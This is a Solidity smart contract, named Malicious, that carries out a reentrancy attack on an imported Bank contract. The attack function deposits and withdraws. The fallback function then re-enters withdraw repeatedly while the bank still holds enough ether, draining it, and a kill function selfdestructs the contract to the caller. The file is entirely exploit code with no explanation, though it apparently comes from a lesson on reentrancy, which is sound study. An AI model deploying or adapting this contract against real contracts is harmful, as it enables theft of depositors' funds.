pragma solidity ^0.5.0;

import './Bank.sol';

contract Malicious {
  Bank public targetBank;

  event LogTest(uint value);

  constructor(address _targetBank) public {
    targetBank = Bank(_targetBank);
  }

  function kill() public {
    selfdestruct(msg.sender);
  }

  function attack() public payable {
    targetBank.enroll();
    targetBank.deposit.value(msg.value)();
    targetBank.withdraw(msg.value);
  }

  function() external payable {
    if(address(targetBank).balance >= msg.value) {
      targetBank.withdraw(msg.value);
    }
  }
}
